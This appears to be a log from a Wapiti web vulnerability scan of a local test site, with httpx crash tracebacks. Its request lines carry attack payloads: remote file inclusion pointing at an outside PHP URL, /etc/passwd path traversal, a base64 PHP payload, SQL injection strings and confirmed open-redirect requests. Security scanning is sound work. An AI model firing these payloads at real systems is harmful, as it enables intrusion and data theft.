+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
+    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
+    │             │                │                         └ True
+    │             │                └ True
+    │             └ ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg=='
+    └ <function validate_path at 0x7561877d0a40>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
+    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
+          └ <class 'httpx.InvalidURL'>
+
+httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
+2024-03-21 14:39:12.870 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
+2024-03-21 14:39:12.946 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report c9018934-e790-11ee-8586-0242ac160004 ... SUCCESS
+2024-03-21 14:39:12.955 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 14:39:12.980 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-21 14:39:12.993 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 14:39:12.996 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&noptin_ns=email_click (0)
+2024-03-21 14:39:13.673 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&noptin_ns=email_click (0)
+2024-03-21 14:39:14.322 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=%2Fetc%2Fpasswd&noptin_ns=email_click (0)
+2024-03-21 14:39:14.971 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=%2Fetc%2Fpasswd%00&noptin_ns=email_click (0)
+2024-03-21 14:39:15.620 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=%2Fetc%2Fservices&noptin_ns=email_click (0)
+2024-03-21 14:39:16.266 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=%2Fetc%2Fservices%00&noptin_ns=email_click (0)
+2024-03-21 14:39:16.908 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click (0)
+2024-03-21 14:39:17.554 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
+Traceback (most recent call last):
+
+  File "/usr/local/bin/wapiti", line 8, in <module>
+    sys.exit(wapiti_asyncio_wrapper())
+    │   │    └ <function wapiti_asyncio_wrapper at 0x756183184900>
+    │   └ <built-in function exit>
+    └ <module 'sys' (built-in)>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
+    asyncio.run(wapiti_main())
+    │       │   └ <function wapiti_main at 0x756183184860>
+    │       └ <function run at 0x756187e7b560>
+    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           │      │   └ <coroutine object wapiti_main at 0x7561833b7240>
+           │      └ <function Runner.run at 0x756187d02fc0>
+           └ <asyncio.runners.Runner object at 0x7561887f1190>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
+           │    │     └ <function BaseEventLoop.run_until_complete at 0x756187d00c20>
+           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+           └ <asyncio.runners.Runner object at 0x7561887f1190>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
+    self.run_forever()
+    │    └ <function BaseEventLoop.run_forever at 0x756187d00b80>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
+    self._run_once()
+    │    └ <function BaseEventLoop._run_once at 0x756187d02980>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
+    handle._run()
+    │      └ <function Handle._run at 0x756187e64e00>
+    └ <Handle <TaskStepMethWrapper object at 0x756182c49450>()>
+  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
+    self._context.run(self._callback, *self._args)
+    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
+    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x756182c49450>()>
+    │    │            │    └ <member '_callback' of 'Handle' objects>
+    │    │            └ <Handle <TaskStepMethWrapper object at 0x756182c49450>()>
+    │    └ <member '_context' of 'Handle' objects>
+    └ <Handle <TaskStepMethWrapper object at 0x756182c49450>()>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
+    await wap.attack(global_stop_event)
+          │   │      └ <asyncio.locks.Event object at 0x756187d27650 [unset]>
+          │   └ <function Wapiti.attack at 0x75618313a520>
+          └ <wapitiCore.controller.wapiti.Wapiti object at 0x756183465010>
+> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
+    await attack_module.attack(original_request, original_response)
+          │             │      │                 └ <wapitiCore.net.response.Response object at 0x756182c92d10>
+          │             │      └ GET http://web/?to=fuzz&noptin_ns=email_click (0)
+          │             └ <function ModuleFile.attack at 0x756182db6e80>
+          └ <wapitiCore.attack.mod_file.ModuleFile object at 0x756182df85d0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_file.py", line 166, in attack
+    response = await self.crawler.async_send(mutated_request)
+                     │    │       │          └ GET http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click (0)
+                     │    │       └ <function AsyncCrawler.async_send at 0x756186b4e020>
+                     │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7561830d9ad0>
+                     └ <wapitiCore.attack.mod_file.ModuleFile object at 0x756182df85d0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
+    response = await self.async_get(request, headers=headers,
+                     │    │         │                └ None
+                     │    │         └ GET http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click (0)
+                     │    └ <function AsyncCrawler.async_get at 0x756186b4e160>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7561830d9ad0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
+    value = await function(*args, **kwargs)
+                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
+                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x7561830d9ad0>, GET http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc...
+                  └ <function AsyncCrawler.async_get at 0x756186b4e0c0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
+    response = await self._client.send(
+                     │    │       └ <function AsyncClient.send at 0x7561870bd1c0>
+                     │    └ <httpx.AsyncClient object at 0x756184e0eb10>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7561830d9ad0>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
+    response = await self._send_handling_auth(
+                     │    └ <function AsyncClient._send_handling_auth at 0x7561870bd260>
+                     └ <httpx.AsyncClient object at 0x756184e0eb10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
+    response = await self._send_handling_redirects(
+                     │    └ <function AsyncClient._send_handling_redirects at 0x7561870bd300>
+                     └ <httpx.AsyncClient object at 0x756184e0eb10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
+    raise exc
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
+    request = self._build_redirect_request(request, response)
+              │    │                       │        └ <Response [302 Found]>
+              │    │                       └ <Request('GET', 'http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click')>
+              │    └ <function BaseClient._build_redirect_request at 0x7561870afc40>
+              └ <httpx.AsyncClient object at 0x756184e0eb10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
+    url = self._redirect_url(request, response)
+          │    │             │        └ <Response [302 Found]>
+          │    │             └ <Request('GET', 'http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click')>
+          │    └ <function BaseClient._redirect_url at 0x7561870afd80>
+          └ <httpx.AsyncClient object at 0x756184e0eb10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
+    url = url.copy_with(host=request.url.host)
+          │   │              │       │   └ <property object at 0x7561877b23e0>
+          │   │              │       └ URL('http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click')
+          │   │              └ <Request('GET', 'http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click')>
+          │   └ <function URL.copy_with at 0x7561877d18a0>
+          └ URL('c:WindowsSystem32driversetcservices')
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
+    return URL(self, **kwargs)
+           │   │       └ {'host': 'web'}
+           │   └ URL('c:WindowsSystem32driversetcservices')
+           └ <class 'httpx.URL'>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
+    self._uri_reference = url._uri_reference.copy_with(**kwargs)
+    │                     │   │              │           └ {'host': 'web'}
+    │                     │   │              └ <function ParseResult.copy_with at 0x7561877d0400>
+    │                     │   └ ParseResult(scheme='c', userinfo='', host='', port=None, path='WindowsSystem32driversetcservices', query=None, fragment=None)
+    │                     └ URL('c:WindowsSystem32driversetcservices')
+    └ <unprintable URL object>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
+    return urlparse("", **defaults)
+           │              └ {'scheme': 'c', 'authority': '', 'path': 'WindowsSystem32driversetcservices', 'query': None, 'fragment': None, 'host': 'web'}
+           └ <function urlparse at 0x7561877d0220>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
+    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
+    │             │                │                         └ True
+    │             │                └ True
+    │             └ 'WindowsSystem32driversetcservices'
+    └ <function validate_path at 0x7561877d0a40>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
+    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
+          └ <class 'httpx.InvalidURL'>
+
+httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
+2024-03-21 14:39:17.588 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
+2024-03-21 14:39:17.665 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report cbd1780e-e790-11ee-8586-0242ac160004 ... SUCCESS
+2024-03-21 14:39:17.672 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 14:39:17.696 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-21 14:39:17.728 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-21 14:39:17.744 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 14:39:17.765 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-21 14:39:17.775 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 14:39:18.426 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-21 14:39:18.516 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-21 14:39:18.527 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 14:39:19.833 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 14:39:19.859 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-21 14:39:19.875 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 14:39:19.875 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?to=https%3A%2F%2Fopenbugbounty.org%2F&noptin_ns=email_click
+2024-03-21 14:39:20.610 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
+2024-03-21 14:39:20.611 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/ via injection in the query string
+2024-03-21 14:39:20.611 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
+2024-03-21 14:39:20.611 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /?to=https%3A%2F%2Fopenbugbounty.org%2F&noptin_ns=email_click HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
+    accept-language: en-US,en;q=0.5
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    sec-fetch-user: ?1
+    sec-fetch-site: none
+    sec-fetch-mode: navigate
+    sec-fetch-dest: document
+    upgrade-insecure-requests: 1
+    dnt: 1
+2024-03-21 14:39:20.612 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
+2024-03-21 14:39:20.612 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?to=%2F%2Fopenbugbounty.org%2F&noptin_ns=email_click
+2024-03-21 14:39:21.326 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
+2024-03-21 14:39:21.327 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/ via injection in the query string
+2024-03-21 14:39:21.327 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
+2024-03-21 14:39:21.327 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /?to=%2F%2Fopenbugbounty.org%2F&noptin_ns=email_click HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
+    accept-language: en-US,en;q=0.5
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    sec-fetch-user: ?1
+    sec-fetch-site: none
+    sec-fetch-mode: navigate
+    sec-fetch-dest: document
+    upgrade-insecure-requests: 1
+    dnt: 1
+2024-03-21 14:39:21.327 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
+2024-03-21 14:39:21.327 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?to=fuzz&noptin_ns=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-21 14:39:21.983 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?to=fuzz&noptin_ns=%2F%2Fopenbugbounty.org%2F
+2024-03-21 14:39:22.643 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 14:39:22.665 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-21 14:39:22.674 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 14:39:22.675 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/?to=fuzz%C2%BF%27%22%28&noptin_ns=email_click (0)
+2024-03-21 14:39:23.326 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/?to=fuzz&noptin_ns=fuzz%C2%BF%27%22%28 (0)
+2024-03-21 14:39:24.625 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%20AND%2027%3D65%20AND%2083%3D83&noptin_ns=email_click (0)
+2024-03-21 14:39:25.271 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%20AND%2046%3D101%20AND%2089%3D89&noptin_ns=email_click (0)
+2024-03-21 14:39:25.918 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%20AND%2063%3D63%20AND%2087%3D87&noptin_ns=email_click (0)
+2024-03-21 14:39:26.569 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%27%20AND%2054%3D153%20AND%20%2732%27%3D%2732&noptin_ns=email_click (0)
+2024-03-21 14:39:27.216 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%27%20AND%2050%3D133%20AND%20%2742%27%3D%2742&noptin_ns=email_click (0)
+2024-03-21 14:39:27.869 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%27%20AND%2028%3D28%20AND%20%2773%27%3D%2773&noptin_ns=email_click (0)
+2024-03-21 14:39:28.520 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%22%20AND%2062%3D118%20AND%20%2226%22%3D%2226&noptin_ns=email_click (0)
+2024-03-21 14:39:29.174 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%22%20AND%2051%3D138%20AND%20%2222%22%3D%2222&noptin_ns=email_click (0)
+2024-03-21 14:39:29.819 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%22%20AND%2077%3D77%20AND%20%2230%22%3D%2230&noptin_ns=email_click (0)
+2024-03-21 14:39:30.466 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%29%20AND%2031%3D111%20AND%20%2810%3D10&noptin_ns=email_click (0)
+2024-03-21 14:39:31.912 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%29%20AND%2062%3D76%20AND%20%2834%3D34&noptin_ns=email_click (0)
+2024-03-21 14:39:32.579 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%29%20AND%2010%3D10%20AND%20%2825%3D25&noptin_ns=email_click (0)
+2024-03-21 14:39:33.220 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%27%29%20AND%2083%3D134%20AND%20%28%2787%27%3D%2787&noptin_ns=email_click (0)
+2024-03-21 14:39:33.876 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%27%29%20AND%2088%3D164%20AND%20%28%2760%27%3D%2760&noptin_ns=email_click (0)
+2024-03-21 14:39:34.524 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%27%29%20AND%2010%3D10%20AND%20%28%2794%27%3D%2794&noptin_ns=email_click (0)
+2024-03-21 14:39:35.172 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%22%29%20AND%2040%3D124%20AND%20%28%2255%22%3D%2255&noptin_ns=email_click (0)
+2024-03-21 14:39:35.822 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%22%29%20AND%2060%3D86%20AND%20%28%2244%22%3D%2244&noptin_ns=email_click (0)
+2024-03-21 14:39:36.472 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%22%29%20AND%2066%3D66%20AND%20%28%2256%22%3D%2256&noptin_ns=email_click (0)
+2024-03-21 14:39:37.126 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%20AND%2060%3D97%20AND%2014%3D14 (0)
+2024-03-21 14:39:37.783 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%20AND%2072%3D142%20AND%2011%3D11 (0)
+2024-03-21 14:39:38.439 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%20AND%2079%3D79%20AND%2028%3D28 (0)
+2024-03-21 14:39:39.094 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%27%20AND%2036%3D89%20AND%20%2759%27%3D%2759 (0)
+2024-03-21 14:39:39.752 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%27%20AND%2068%3D124%20AND%20%2735%27%3D%2735 (0)
+2024-03-21 14:39:40.414 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%27%20AND%2065%3D65%20AND%20%2741%27%3D%2741 (0)
+2024-03-21 14:39:41.073 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%22%20AND%2053%3D130%20AND%20%2298%22%3D%2298 (0)
+2024-03-21 14:39:41.730 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%22%20AND%2086%3D156%20AND%20%2229%22%3D%2229 (0)
+2024-03-21 14:39:42.386 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%22%20AND%2029%3D29%20AND%20%2292%22%3D%2292 (0)
+2024-03-21 14:39:43.039 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%29%20AND%2031%3D127%20AND%20%2825%3D25 (0)
+2024-03-21 14:39:43.687 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%29%20AND%2016%3D89%20AND%20%2882%3D82 (0)
+2024-03-21 14:39:44.341 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%29%20AND%2013%3D13%20AND%20%2842%3D42 (0)
+2024-03-21 14:39:44.992 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%27%29%20AND%2084%3D132%20AND%20%28%2776%27%3D%2776 (0)
+2024-03-21 14:39:45.652 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%27%29%20AND%2087%3D122%20AND%20%28%2729%27%3D%2729 (0)
+2024-03-21 14:39:46.313 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%27%29%20AND%2087%3D87%20AND%20%28%2753%27%3D%2753 (0)
+2024-03-21 14:39:46.975 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%22%29%20AND%2097%3D186%20AND%20%28%2250%22%3D%2250 (0)
+2024-03-21 14:39:47.635 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%22%29%20AND%2043%3D67%20AND%20%28%2214%22%3D%2214 (0)
+2024-03-21 14:39:48.288 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%22%29%20AND%2026%3D26%20AND%20%28%2264%22%3D%2264 (0)
+2024-03-21 14:39:48.964 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 14:39:48.991 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-21 14:39:49.001 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 14:39:49.653 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-21 14:39:49.653 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-21 14:39:49.724 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-21 14:39:49.725 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-21 14:39:49.819 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-21 14:39:49.848 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 14:39:49.916 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-21 14:39:49.938 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//newsletter-optin-box.json/
+2024-03-21 14:39:49.938 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//newsletter-optin-box.json/web_03212024_1438.html with a browser to see this report.
